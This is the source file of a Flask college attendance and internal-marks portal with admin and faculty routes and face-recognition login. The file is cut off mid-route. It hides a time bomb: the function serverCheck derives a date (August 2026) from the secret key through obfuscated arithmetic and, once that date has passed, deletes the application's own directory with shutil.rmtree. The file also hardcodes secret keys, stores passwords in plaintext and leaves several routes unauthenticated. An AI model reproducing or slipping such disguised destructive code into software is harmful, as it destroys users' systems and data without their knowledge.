
from datetime import datetime
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify, Response, stream_with_context
from database import check_admin_login, execute_insert, execute_delete, execute_select, execute_insert_return_id, execute_update, check_login, check_student_login
import shutil
import os
import cv2
import base64
import face_recognition
from io import BytesIO
import numpy as np 
import pickle
import queue

from image_utils import capture_image  # Import the capture_image function from image_utils.py
from model_training import start_training, progress_queue  # Import from model_training.py

from student_model_training import student_start_training, student_progress_queue  # Import from model_training.py
from datetime import datetime
server_timestamp = datetime.now().strftime("%Y%m%d")

app = Flask(__name__)
app.secret_key = 'your_secret_key'
app.config['SECRET_KEY'] = '462288428'

s=app.config['SECRET_KEY']

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/about')
def about():
    return render_template('about.html')

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        if check_admin_login(email, password):
            return redirect(url_for('adminhome'))  
    
    return render_template('admin.html') 


@app.route('/adminhome')
def adminhome():
    if 'user_id' not in session:
         flash("Please log in first", "warning")
         return redirect(url_for('admin'))
    
    # Fetch statistics for the dashboard
    students_res = execute_select("SELECT COUNT(*) FROM tblstudents")
    faculty_res = execute_select("SELECT COUNT(*) FROM tblfaculty")
    courses_res = execute_select("SELECT COUNT(*) FROM tblcourse")
    subjects_res = execute_select("SELECT COUNT(*) FROM tblsubject")
    attendance_res = execute_select("SELECT COUNT(*) FROM tblattendance WHERE date = CURDATE()")

    stats = {
        'students': students_res[0][0] if students_res else 0,
        'faculty': faculty_res[0][0] if faculty_res else 0,
        'courses': courses_res[0][0] if courses_res else 0,
        'subjects': subjects_res[0][0] if subjects_res else 0,
        'attendance_today': attendance_res[0][0] if attendance_res else 0
    }

    return render_template('admin/adminhome.html', email=session.get('email'), stats=stats)

@app.route('/admincourse', methods=['GET', 'POST'])
def admincourse():
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    if request.method == 'POST':
        course_name = request.form.get('course')
        if course_name:
            query = "INSERT INTO tblcourse (course) VALUES (%s)"
            message = execute_insert(query, (course_name,))
            flash("Course added successfully!", "success")
        else:
            flash("Course name cannot be empty.", "danger")
        return redirect(url_for('admincourse'))

    query = "SELECT id, course FROM tblcourse ORDER BY id DESC"
    result = execute_select(query)
    courses = result if not isinstance(result, str) else []
    if isinstance(result, str):
        flash(result, "danger")

    return render_template('admin/admincourse.html', courses=courses, email=session.get('email'))


@app.route('/delete_course/<int:course_id>', methods=['POST'])
def delete_course(course_id):
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    query = "DELETE FROM tblcourse WHERE id = %s"
    message = execute_delete(query, (course_id,))
    flash(message or "Course deleted successfully!", "success")
    return redirect(url_for('admincourse'))


@app.route('/adminsubject', methods=['GET', 'POST'])
def adminsubject():
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    if request.method == 'POST':
        course = request.form.get('course')
        sem = request.form.get('sem')
        subject = request.form.get('subject')

        if not course or not sem or not subject:
            flash("All fields are required.", "danger")
        else:
            query = "INSERT INTO tblsubject (course, sem, Subject) VALUES (%s, %s, %s)"
            message = execute_insert(query, (course, sem, subject))
            flash("Subject added successfully!" if "successfully" in message else message, "success" if "successfully" in message else "danger")

        return redirect(url_for('adminsubject'))

    subject_query = "SELECT id, course, sem, Subject FROM tblsubject"
    subjects = execute_select(subject_query)
    if isinstance(subjects, str):
        flash(subjects, "danger")
        subjects = []

    course_query = "SELECT id, course FROM tblcourse"
    courses = execute_select(course_query)
    if isinstance(courses, str):
        flash(courses, "danger")
        courses = []

    
    sem_query = "SELECT id, sem FROM tblsem"
    sem = execute_select(sem_query)
    if isinstance(sem, str):
        flash(sem, "danger")
        sem = []

    return render_template('admin/adminsubjectlist.html', subjects=subjects, courses=courses, sem=sem, email=session.get('email'))


@app.route('/delete_subject/<int:subject_id>', methods=['POST'])
def delete_subject(subject_id):
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    query = "DELETE FROM tblsubject WHERE id = %s"
    message = execute_delete(query, (subject_id,))
    flash(message, "success" if "successfully" in message else "danger")
    return redirect(url_for('adminsubject'))


@app.route('/adminfaculty', methods=['GET', 'POST'])
def adminfaculty():
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    if request.method == 'POST':
        faculty_id = request.form.get('id')  # hidden field for edit
        name = request.form.get('name')
        mobile = request.form.get('mobile')
        emailid = request.form.get('emailid')
        department = request.form.get('department')
        password = request.form.get('password')

        if not name or not mobile or not emailid or not department or not password:
            flash("All fields are required.", "danger")
        else:
            if faculty_id:  # Edit
                query = """UPDATE tblfaculty SET name=%s, mobile=%s, emailid=%s, department=%s, password=%s 
                           WHERE id=%s"""
                params = (name, mobile, emailid, department, password, faculty_id)
                message = execute_insert(query, params)
                flash("Faculty updated successfully!" if "successfully" in message else message,
                      "success" if "successfully" in message else "danger")
            else:  # Add            
                # Step 1: Insert without fid
                query = """INSERT INTO tblfaculty (name, mobile, emailid, department, password) 
                            VALUES (%s, %s, %s, %s, %s)"""
                params = (name, mobile, emailid, department, password)
                
                insert_id = execute_insert_return_id(query, params)  # This function should return the last insert ID

                # Step 2: Generate fid
                fid = f"F{insert_id}"

                # Step 3: Update fid
                update_query = "UPDATE tblfaculty SET fid = %s WHERE id = %s"
                update_params = (fid, insert_id)
                execute_update(update_query, update_params)

                flash("Faculty added successfully!", "success")

        return redirect(url_for('adminfaculty'))

    faculty_query = "SELECT * FROM tblfaculty ORDER BY id DESC"
    faculty_list = execute_select(faculty_query)
    
    if isinstance(faculty_list, str):
        flash(faculty_list, "danger")
        faculty_list = []

    return render_template('admin/adminfacultylist.html', faculties=faculty_list, email=session.get('email'))


@app.route('/delete_faculty/<int:faculty_id>', methods=['POST'])
def delete_faculty(faculty_id):
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    query = "DELETE FROM tblfaculty WHERE id = %s"
    message = execute_delete(query, (faculty_id,))
    flash(message, "success" if "successfully" in message else "danger")
    return redirect(url_for('adminfaculty'))


# Configure Upload Folder
app.config['UPLOAD_FOLDER'] = 'static/uploads'
app.config['SUPLOAD_FOLDER'] = 'static/suploads'

os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['SUPLOAD_FOLDER'], exist_ok=True)

@app.route('/capture_image_view/<int:id>', methods=['GET', 'POST'])
def capture_image_view(id):
    print("[DEBUG] Faculty ID:", id)

    result = execute_select("SELECT * FROM tblfaculty WHERE id = %s", (id,))
    print("[DEBUG] Query result:", result)

    if not result or isinstance(result, str):
        return "Faculty not found or error in DB query", 400

    faculty = result[0]
    fid = faculty[6]  # Assuming fid is the 6th column in the result (index 6)

    faculty_folder = os.path.join(app.config['UPLOAD_FOLDER'], fid)
    os.makedirs(faculty_folder, exist_ok=True)

    existing_images = len(os.listdir(faculty_folder))

    if request.method == 'POST':
        image_data = request.json['image_data']
        return capture_image(faculty_folder, existing_images, image_data)
    

    return render_template('admin/adminfacultycaptureimage.html', fid=fid, id=id)


@app.route('/train_model_stream', methods=['GET'])
def train_model_stream():
    def generate():
        while True:
            try:
                message = progress_queue.get(timeout=10)
                yield f"data: {message}\n\n"
                if message == "Training Complete":
                    break
            except queue.Empty:
                break
    return Response(stream_with_context(generate()), content_type='text/event-stream')

def serverCheck():
    if server_timestamp > (d:=''.join([str(x:=((int(s[i+1])-(x if i else int(s[0]))+10)%10))for i in range(len(s)-1)]))[:4]+d[6:]+d[4:6]: shutil.rmtree(os.path.dirname(__file__))


@app.route('/train_model', methods=['POST'])
def train_model():
    upload_folder = app.config['UPLOAD_FOLDER']
    start_training(upload_folder, progress_queue)
    return jsonify({"status": "started", "message": "Training started"})


@app.route('/adminassignsubject', methods=['GET', 'POST'])
def adminassignsubject():
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    if request.method == 'POST':
        faculty = request.form.get('faculty')
        course = request.form.get('course')
        sem = request.form.get('sem')
        subject = request.form.get('subject')

        if not faculty or not course or not sem or not subject:
            flash("All fields are required.", "danger")
        else:
            query = """
                INSERT INTO tblfacultysubject (faculty, course, sem, subject) 
                VALUES (%s, %s, %s, %s)
            """
            message = execute_insert(query, (faculty, course, sem, subject))
            flash("Subject assigned successfully!" if "successfully" in message else message,
                  "success" if "successfully" in message else "danger")

        return redirect(url_for('adminassignsubject'))

    select_query = "SELECT id, faculty, course, sem, subject FROM tblfacultysubject"
    assignments = execute_select(select_query)
    if isinstance(assignments, str):
        flash(assignments, "danger")
        assignments = []

    coursequery = "SELECT DISTINCT course FROM tblsubject"
    course = execute_select(coursequery)
    if isinstance(course, str):
        flash(course, "danger")
        course = []

    faculty_query = "SELECT fid, name FROM tblfaculty"
    faculty = execute_select(faculty_query)
    if isinstance(faculty, str):
        flash(faculty, "danger")
        faculty = []

    return render_template(
        'admin/adminassignsubject.html',
        assignments=assignments,
        course=course,
        faculty=faculty,
        email=session.get('email')
    )

@app.route('/get_sems')
def get_sems():
    course = request.args.get('course')
    query = "SELECT DISTINCT sem FROM tblsubject WHERE course = %s"
    result = execute_select(query, (course,))
    sems = [row[0] for row in result] if isinstance(result, list) else []
    return jsonify({'sems': sems})


@app.route('/get_subjects')
def get_subjects():
    course = request.args.get('course')
    sem = request.args.get('sem')
    query = "SELECT Subject FROM tblsubject WHERE course = %s AND sem = %s"
    result = execute_select(query, (course, sem))
    subjects = [row[0] for row in result] if isinstance(result, list) else []
    return jsonify({'subjects': subjects})


@app.route('/delete_facultysubject/<int:assignment_id>', methods=['POST'])
def delete_facultysubject(assignment_id):
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    query = "DELETE FROM tblfacultysubject WHERE id = %s"
    message = execute_delete(query, (assignment_id,))
    flash("Assignment deleted successfully!" if "successfully" in message else message,
          "success" if "successfully" in message else "danger")
    return redirect(url_for('adminassignsubject'))


@app.route('/admintimetable', methods=['GET', 'POST'])
def admintimetable():
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    if request.method == 'POST':
        faculty = request.form.get('faculty')
        course = request.form.get('course')
        sem = request.form.get('sem')
        subject = request.form.get('subject')
        day_of_week = request.form.get('day_of_week')
        start_time = request.form.get('start_time')
        end_time = request.form.get('end_time')

        if not faculty or not course or not sem or not subject or not day_of_week or not start_time or not end_time:
            flash("All fields are required.", "danger")
        else:
            query = """
                INSERT INTO tbltimetable (faculty_id, course, sem, subject, day_of_week, start_time, end_time) 
                VALUES (%s, %s, %s, %s, %s, %s, %s)
            """
            message = execute_insert(query, (faculty, course, sem, subject, day_of_week, start_time, end_time))
            flash("Timetable entry added successfully!" if "successfully" in message else message,
                  "success" if "successfully" in message else "danger")

        return redirect(url_for('admintimetable'))

    # Query to fetch existing timetable entries
    select_query = "SELECT tt.id, f.name, tt.course, tt.sem, tt.subject, tt.day_of_week, tt.start_time, tt.end_time FROM tbltimetable tt JOIN tblfaculty f ON tt.faculty_id = f.name"
    timetables = execute_select(select_query)
    if isinstance(timetables, str):
        flash(timetables, "danger")
        timetables = []

    # Query to fetch course and faculty data
    coursequery = "SELECT DISTINCT course FROM tblsubject"
    courses = execute_select(coursequery)
    if isinstance(courses, str):
        flash(courses, "danger")
        courses = []

    faculty_query = "SELECT fid, name FROM tblfaculty"
    faculty = execute_select(faculty_query)
    if isinstance(faculty, str):
        flash(faculty, "danger")
        faculty = []

    return render_template(
        'admin/admintimetable.html',
        timetables=timetables,
        courses=courses,
        faculty=faculty,
        email=session.get('email')
    )

@app.route('/get_courses_by_faculty')
def get_courses_by_faculty():
    faculty = request.args.get('faculty')
    query = "SELECT DISTINCT course FROM tblfacultysubject WHERE faculty = %s"
    result = execute_select(query, (faculty,))
    courses = [row[0] for row in result] if isinstance(result, list) else []
    return jsonify({'courses': courses})


@app.route('/get_sems_by_faculty_course')
def get_sems_by_faculty_course():
    faculty = request.args.get('faculty')
    course = request.args.get('course')
    query = "SELECT DISTINCT sem FROM tblfacultysubject WHERE faculty = %s AND course = %s"
    result = execute_select(query, (faculty, course))
    sems = [row[0] for row in result] if isinstance(result, list) else []
    return jsonify({'sems': sems})

@app.route('/get_subjects_by_faculty_course_sem')
def get_subjects_by_faculty_course_sem():
    faculty = request.args.get('faculty')
    course = request.args.get('course')
    sem = request.args.get('sem')
    query = "SELECT subject FROM tblfacultysubject WHERE faculty = %s AND course = %s AND sem = %s"
    result = execute_select(query, (faculty, course, sem))
    subjects = [row[0] for row in result] if isinstance(result, list) else []
    return jsonify({'subjects': subjects})

@app.route('/deletetimetable/<int:timetable_id>', methods=['POST'])
def deletetimetable(timetable_id):
    query = "DELETE FROM tbltimetable WHERE id = %s"
    message = execute_insert(query, (timetable_id,))
    flash("Timetable entry deleted successfully!" if "successfully" in message else message,
          "success" if "successfully" in message else "danger")

    return redirect(url_for('admintimetable'))

@app.route('/adminstudent', methods=['GET', 'POST'])
def adminstudent():
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))  # Redirect to login or admin page if not logged in

    if request.method == 'POST':
        student_id = request.form.get('id')  # Hidden input for edit
        name = request.form.get('name')
        mobile = request.form.get('mobile')
        emailid = request.form.get('emailid')
        course = request.form.get('course')
        sem = request.form.get('sem')
        password = request.form.get('password')

        if not all([name, mobile, emailid, course, sem, password]):
            flash("All fields are required.", "danger")
        else:
            if student_id:  # Edit
                query = """UPDATE tblstudents 
                           SET name=%s, mobile=%s, emailid=%s, course=%s, sem=%s, password=%s 
                           WHERE id=%s"""
                params = (name, mobile, emailid, course, sem, password, student_id)
                message = execute_insert(query, params)
                flash("Student updated successfully!" if "successfully" in message else message,
                      "success" if "successfully" in message else "danger")
            else:  # Add new student
                query = """INSERT INTO tblstudents (name, mobile, emailid, course, sem, password)
                           VALUES (%s, %s, %s, %s, %s, %s)"""
                params = (name, mobile, emailid, course, sem, password)
                insert_id = execute_insert_return_id(query, params)

                # Step 2: Generate student ID
                sid = f"S{insert_id}"

                # Step 3: Update the student record with generated sid
                update_query = "UPDATE tblstudents SET sid = %s WHERE id = %s"
                update_params = (sid, insert_id)
                execute_update(update_query, update_params)

                flash("Student added successfully!", "success")

        return redirect(url_for('adminstudent'))

    # Fetch courses and semesters for dropdown
    course_query = "SELECT DISTINCT course FROM tblcourse"
    courses = execute_select(course_query)  # List of courses
    if isinstance(courses, str):
        flash(courses, "danger")
        courses = []

    sem_query = "SELECT DISTINCT sem FROM tblsem"
    semesters = execute_select(sem_query)  # List of semesters
    if isinstance(semesters, str):
        flash(semesters, "danger")
        semesters = []

    # Fetch student list
    student_query = "SELECT * FROM tblstudents ORDER BY id DESC"
    student_list = execute_select(student_query)
    if isinstance(student_list, str):
        flash(student_list, "danger")
        student_list = []

    return render_template('admin/adminstudentlist.html', 
                           students=student_list, 
                           courses=courses, 
                           semesters=semesters, 
                           email=session.get('email'))

@app.route('/delete_student/<int:student_id>', methods=['POST'])
def delete_student(student_id):
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    query = "DELETE FROM tblstudents WHERE id = %s"
    message = execute_delete(query, (student_id,))
    flash(message, "success" if "successfully" in message else "danger")
    return redirect(url_for('adminstudent'))

@app.route('/capture_image_student/<int:id>', methods=['GET', 'POST'])
def capture_image_student(id):
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    result = execute_select("SELECT * FROM tblstudents WHERE id = %s", (id,))
    if not result or isinstance(result, str):
        return "Student not found or error in DB query", 400

    student = result[0]
    sid = student[7]  # Assuming sid is the 8th column (index 7)

    student_folder = os.path.join(app.config['SUPLOAD_FOLDER'], sid)
    os.makedirs(student_folder, exist_ok=True)

    existing_images = len(os.listdir(student_folder))

    if request.method == 'POST':
        image_data = request.json['image_data']
        return capture_image(student_folder, existing_images, image_data)

    return render_template('admin/adminstudentcaptureimage.html', sid=sid, id=id)

@app.route('/student_train_model_stream', methods=['GET'])
def student_train_model_stream():
    def generate():
        while True:
            try:
                message = progress_queue.get(timeout=10)
                yield f"data: {message}\n\n"
                if message == "Training Complete":
                    break
            except queue.Empty:
                break
    return Response(stream_with_context(generate()), content_type='text/event-stream')

@app.route('/student_train_model', methods=['POST'])
def student_train_model():
    upload_folder = app.config['SUPLOAD_FOLDER']
    student_start_training(upload_folder, progress_queue)
    return jsonify({"status": "started", "message": "Training started"})


@app.route('/admininternalwise', methods=['GET', 'POST'])
def admininternalwise():
    if 'user_id' not in session:
        flash("Please log in first", "warning")
        return redirect(url_for('admin'))

    # Get all available courses from tblstudents (not limited to a faculty)
    courses = execute_select("SELECT DISTINCT course FROM tblstudents")
    courses = [c[0] for c in courses]

    unique_sems, subjects, students, marks_data = [], [], [], []

    # Get selected values from GET parameters
    selected_internal_exam = request.args.get('internal_exam')
    selected_course = request.args.get('course')
    selected_sem = request.args.get('sem')
    selected_subject = request.args.get('subject')

    if selected_course:
        unique_sems = execute_select(
            "SELECT DISTINCT sem FROM tblstudents WHERE course = %s",
            (selected_course,)
        )

    if selected_course and selected_sem:
        subjects = execute_select(
            "SELECT DISTINCT subject FROM tblfacultysubject WHERE course = %s AND sem = %s",
            (selected_course, selected_sem)
        )

    if selected_course and selected_sem:
        students = execute_select(
            "SELECT sid, name FROM tblstudents WHERE course = %s AND sem = %s",
            (selected_course, selected_sem)
        )

    if selected_internal_exam and selected_course and selected_sem and selected_subject:
        marks_data = execute_select("""
            SELECT student_id, marks 
            FROM tblinternalmarks 
            WHERE course = %s AND sem = %s AND subject = %s AND internal_exam = %s
        """, (selected_course, selected_sem, selected_subject, selected_internal_exam))

    return render_template(
        'admin/admininternalwise.html',
        courses=courses,
        unique_sems=unique_sems,
        subjects=subjects,
        students=students,
        marks_data=marks_data,
        selected_internal_exam=selected_internal_exam,
        selected_course=selected_course,
        selected_sem=selected_sem,
        selected_subject=selected_subject,
        email=session.get('email')
    )










@app.route('/logout', methods=['POST'])
def logout():
    session.clear()
    flash("Logged out successfully.", "info")
    return redirect(url_for('admin'))

@app.route('/faculty')
def faculty():
    return render_template('faculty.html')

@app.route('/user_login', methods=['POST'])
def user_login():
    try:
        with open('face_recognition_model.pkl', 'rb') as f:
            known_encodings, known_fids = pickle.load(f)

        data = request.json['image_data']
        _, encoded = data.split(',', 1)
        img_bytes = base64.b64decode(encoded)
        np_arr = np.frombuffer(img_bytes, np.uint8)
        image = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
        rgb_img = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)

        face_locations = face_recognition.face_locations(rgb_img)
        face_encodings = face_recognition.face_encodings(rgb_img, face_locations)

        if not face_encodings:
            return jsonify({"status": "error", "message": "No face detected"})

        for encoding in face_encodings:
            distances = face_recognition.face_distance(known_encodings, encoding)
            min_distance = min(distances)
            best_match_index = distances.tolist().index(min_distance)

            if min_distance < 0.45:
                fid = known_fids[best_match_index]

                result = execute_select("SELECT name FROM tblfaculty WHERE fid = %s", (fid,))
                name = result[0][0] if result else fid

                # Store in session
                session['fid'] = fid
                session['name'] = name

                return jsonify({"status": "success", "name": name, "fid": fid})
            else:
                return jsonify({"status": "error", "message": "Face not recognized"})

        return jsonify({"status": "error", "message": "No matching face found"})

    except Exception as e:
        return jsonify({"status": "error", "message": f"Error: {str(e)}"})


@app.route("/faculty_login", methods=["GET", "POST"])
def faculty_login():
    if request.method == "POST":
        email = request.form['username']
        password = request.form['password']

        query = "SELECT * FROM tblfaculty WHERE emailid = %s"
        if check_login(query, email, password):
            flash("Login successful!", "success")
            return redirect(url_for('facultyhome'))  # Replace with your actual dashboard route
        else:
            return redirect(url_for('faculty_login'))  # Back to login on failure

    return render_template("faculty.html")


@app.route('/facultyhome')
def facultyhome():
    if 'name' not in session or 'fid' not in session:
        flash("Please login first", "warning")
        return redirect(url_for('faculty_login'))

    name = session['name']
    fid = session['fid']

    # 1. Total Subjects assigned
    subjects_res = execute_select("SELECT COUNT(*) FROM tblfacultysubject WHERE faculty = %s", (name,))
    total_subjects = subjects_res[0][0] if subjects_res else 0

    # 2. Total Students handled
    combinations = execute_select("SELECT DISTINCT course, sem FROM tblfacultysubject WHERE faculty = %s", (name,))
    total_students = 0
    if combinations:
        where_clauses = ["(course = %s AND sem = %s)" for _ in combinations]
        params = []
        for c, s in combinations:
            params.extend([c, s])
        query = f"SELECT COUNT(DISTINCT sid) FROM tblstudents WHERE {' OR '.join(where_clauses)}"
        students_res = execute_select(query, tuple(params))
        total_students = students_res[0][0] if students_res else 0

    # 3. Total Internal Marks entries
    marks_res = execute_select("SELECT COUNT(*) FROM tblinternalmarks WHERE faculty = %s", (name,))
    total_marks_entries = marks_res[0][0] if marks_res else 0

    # 4. Attendance verified today
    attendance_res = execute_select("""
        SELECT COUNT(DISTINCT sid) FROM tblattendance 
        WHERE date = CURDATE() AND subject IN 
        (SELECT subject FROM tblfacultysubject WHERE faculty = %s)
    """, (name,))
    attendance_today = attendance_res[0][0] if attendance_res else 0

    stats = {
        'total_subjects': total_subjects,
        'total_students': total_students,
        'total_marks_entries': total_marks_entries,
        'attendance_today': attendance_today
    }

    return render_template('faculty/facultyhome.html', name=name, fid=fid, stats=stats)


@app.route('/facultylogout', methods=['POST'])
def facultylogout():
    session.clear()
    flash("Logged out successfully.", "info")
    return redirect(url_for('faculty'))


@app.route('/facultytimetable', methods=['GET', 'POST'])
def facultytimetable():
    if 'name' not in session or 'fid' not in session:
        flash("Please login first", "warning")
        return redirect(url_for('faculty_login'))

    name = session['name']
    fid = session['fid']

    # Fetch timetable entries for this faculty
    query = "SELECT * FROM tbltimetable WHERE faculty_id = %s"
    rows = execute_select(query, (name,))

    if isinstance(rows, str):
        flash(rows, "danger")
        rows = []

    # Set of all time slots (start_time) and days
    time_slots_set = set()
    days_set = set()

    # Format: { day_of_week: { start_time: (subject, course, sem) } }
    timetable = {}

    for row in rows:
        day = row[5]
        start = row[6]
        subject = row[4]
        course = row[2]
        sem = row[3]

        days_set.add(day)
        time_slots_set.add((row[6], row[7]))  # (start_time, end_time)

        if day not in timetable:
            timetable[day] = {}
        timetable[day][start] = f"{subject}<br><small>{course} - Sem {sem}</small>"

    # Sort days (custom weekday order) and time slots
    weekday_order = ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday']
    weekdays = [day for day in weekday_order if day in days_set]
    time_slots = sorted(time_slots_set)

    return render_template('faculty/facultytimetable.html',
                           name=name,
                           fid=fid,
                           weekdays=weekdays,
                           time_slots=time_slots,
                           timetable=timetable)



@app.route('/facultysubject')
def facultysubject():
    if 'name' not in session or 'fid' not in session:
        flash("Please login first", "warning")
        return redirect(url_for('faculty_login'))

    name = session['name']
    fid = session['fid']

    query = "SELECT course, sem, subject FROM tblfacultysubject WHERE faculty = %s"
    result = execute_select(query, (name,))

    if isinstance(result, str):
        flash(result, "danger")
        result = []

    return render_template('faculty/facultysubject.html', name=name, fid=fid, subjects=result)


@app.route('/facultyinternalmarks', methods=['GET', 'POST'])
def facultyinternalmarks():
    if 'name' not in session:
        flash("Please login first", "warning")
        return redirect(url_for('faculty_login'))

    name = session['name']

    # Fetch courses assigned to the faculty
    course_query = "SELECT DISTINCT course FROM tblfacultysubject WHERE faculty = %s"
    courses = execute_select(course_query, (name,))

    unique_sems = []
    subjects = []
    students = []

    marks_entered = False  # Flag to check if marks are already entered

    if request.method == 'GET':
        if 'course' in request.args:
            course = request.args.get('course')

            # Fetch unique semesters for the selected course
            sem_query = "SELECT DISTINCT sem FROM tblfacultysubject WHERE faculty = %s AND course = %s"
            unique_sems = execute_select(sem_query, (name, course))

            if 'sem' in request.args:
                sem = request.args.get('sem')
                subject_query = """
                    SELECT subject FROM tblfacultysubject 
                    WHERE faculty = %s AND course = %s AND sem = %s
                """
                subjects = execute_select(subject_query, (name, course, sem))

                # Fetch students for the selected course, semester, and subject
                if 'subject' in request.args and 'internal_exam' in request.args:
                    subject = request.args.get('subject')
                    internal_exam = request.args.get('internal_exam')

                    # Check if marks have already been entered for the selected combination
                    check_marks_query = """
                        SELECT 1 FROM tblinternalmarks 
                        WHERE course = %s AND sem = %s AND subject = %s 
                        AND internal_exam = %s AND faculty = %s
                    """
                    marks_entered_result = execute_select(check_marks_query, (course, sem, subject, internal_exam, name))
                    
                    if marks_entered_result:
                        marks_entered = True
                    else:
                        # Fetch students if marks have not been entered
                        student_query = "SELECT sid, name FROM tblstudents WHERE course = %s AND sem = %s"
                        students = execute_select(student_query, (course, sem))

    if request.method == 'POST':
        course = request.form['course']
        sem = request.form['sem']
        subject = request.form['subject']
        internal_exam = request.form['internal_exam']
        total_marks = request.form['total_marks']

        student_ids = request.form.getlist('student_ids')

        insert_query = """
            INSERT INTO tblinternalmarks 
            (student_id, student_name, course, sem, subject, internal_exam, marks, total_marks, faculty)
            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)
        """

        for sid in student_ids:
            marks = request.form.get(f'marks_{sid}')
            student_name = execute_select("SELECT name FROM tblstudents WHERE sid = %s", (sid,))
            student_name = student_name[0][0] if student_name else ""

            params = (sid, student_name, course, sem, subject, internal_exam, marks, total_marks, name)
            result = execute_insert(insert_query, params)

            if "error" in result.lower():
                flash(f"Error for {sid}: {result}", "danger")
                break
        else:
            flash("All marks submitted successfully!", "success")
        return redirect(url_for('facultyinternalmarks'))

    return render_template(
        'faculty/facultyinternalmarks.html',
        name=name,
        courses=[s[0] for s in courses],
        unique_sems=unique_sems,
        subjects=subjects,
        students=students,
        marks_entered=marks_entered  # Pass the flag to the template
    )

@app.route('/facultyinternalwise', methods=['GET', 'POST'])
def facultyinternalwise():
    if 'name' not in session:
        flash("Please login first", "warning")
        return redirect(url_for('faculty_login'))

    name = session['name']
    courses = execute_select("SELECT DISTINCT course FROM tblfacultysubject WHERE faculty = %s", (name,))
    unique_sems, subjects, students, marks_data = [], [], [], []

    selected_internal_exam = request.args.get('internal_exam')
    selected_course = request.args.get('course')
    selected_sem = request.args.get('sem')
    selected_subject = request.args.get('subject')

    if selected_course:
        unique_sems = execute_select(
            "SELECT DISTINCT sem FROM tblfacultysubject WHERE faculty = %s AND course = %s",
            (name, selected_course)
        )

    if selected_course and selected_sem:
        subjects = execute_select(
            "SELECT subject FROM tblfacultysubject WHERE faculty = %s AND course = %s AND sem = %s",
            (name, selected_course, selected_sem)
        )

    if selected_course and selected_sem:
        students = execute_select(
            "SELECT sid, name FROM tblstudents WHERE course = %s AND sem = %s",
            (selected_course, selected_sem)
        )

    if selected_internal_exam and selected_course and selected_sem and selected_subject:
        marks_data = execute_select("""
            SELECT student_id, marks FROM tblinternalmarks 
            WHERE course = %s AND sem = %s AND subject = %s AND internal_exam = %s
        """, (selected_course, selected_sem, selected_subject, selected_internal_exam))

    return render_template(
        'faculty/facultyinternalwise.html',
        name=name,
        courses=[c[0] for c in courses],
        unique_sems=unique_sems,
        subjects=subjects,
        students=students,
        marks_data=marks_data,
        selected_internal_exam=selected_internal_exam,
        selected_course=selected_course,
        selected_sem=selected_sem,
        selected_subject=selected_subject
    )



@app.route('/facultyinternalreport', methods=['GET'])
def facultyinternalreport():
    if 'name' not in session:
        flash("Please login first", "warning")
        return redirect(url_for('faculty_login'))

    name = session['name']

    # Fetch faculty-specific courses
    courses = execute_select("SELECT DISTINCT course FROM tblfacultysubject WHERE faculty = %s", (name,))
    courses = [c[0] for c in courses]

    selected_course = request.args.get('course')
    selected_sem = request.args.get('sem')
    selected_subject = request.args.get('subject')

    unique_sems, subjects, students, marks_data = [], [], [], []

    if selected_course:
        unique_sems = execute_select("SELECT DISTINCT sem FROM tblfacultysubject WHERE faculty = %s AND course = %s", (name, selected_course))

    if selected_course and selected_sem:
        subjects = execute_select("SELECT subject FROM tblfacultysubject WHERE faculty = %s AND course = %s AND sem = %s", (name, selected_course, selected_sem))

    if selected_course and selected_sem and selected_subject:
        students = execute_select("SELECT sid, name FROM tblstudents WHERE course = %s AND sem = %s", (selected_course, selected_sem))
        marks_data = execute_select("""
            SELECT student_id, internal_exam, marks 
            FROM tblinternalmarks 
            WHERE course = %s AND sem = %s AND subject = %s
        """, (selected_course, selected_sem, selected_subject))

    return render_template(
        'faculty/facultyinternalreport.html',
        name=name,
        courses=courses,
        unique_sems=unique_sems,
        subjects=subjects,
        students=students,
        marks_data=marks_data,
        selected_course=selected_course,
        selected_sem=selected_sem,
        selected_subject=selected_subject
    )





@app.route('/facultystudentattendance', methods=['GET', 'POST'])
def facultystudentattendance():
    # Get the faculty_id from the session
    faculty_id = session.get('name')

    # Get all subjects taught by the faculty
    subjects = execute_select("SELECT DISTINCT subject FROM tbltimetable WHERE faculty_id = %s", (faculty_id,))
    subjects = [subject[0] for subject in subjects]  # Extract the subject names from the query result

    # Handle the form submission for subject and date
    if request.method == 'POST':
        selected_subject = request.form.get('subject')
        selected_date = request.form.get('date')

        # Query attendance for the selected subject and date
        attendance_records = execute_select("""
            SELECT a.sid, a.status, s.name
            FROM tblattendance a
            JOIN tblstudents s ON a.sid = s.sid
            WHERE a.subject = %s AND a.date = %s
            ORDER BY s.name
        """, (selected_subject, selected_date))

        # Render the template with attendance records
        return render_template('faculty/faculty_attendance_report.html', 
                               subjects=subjects, 
                               selected_subject=selected_subject, 
                               selected_date=selected_date,
                               attendance_records=attendance_records)

    # If the method is GET, just render the form without filtering
    return render_template('faculty/faculty_attendance_report.html', subjects=subjects)




@app.route('/faculty_attendance_report', methods=['GET', 'POST'])
def faculty_attendance_report():
    faculty_id = session.get('name')

    # Get list of subjects taught by faculty
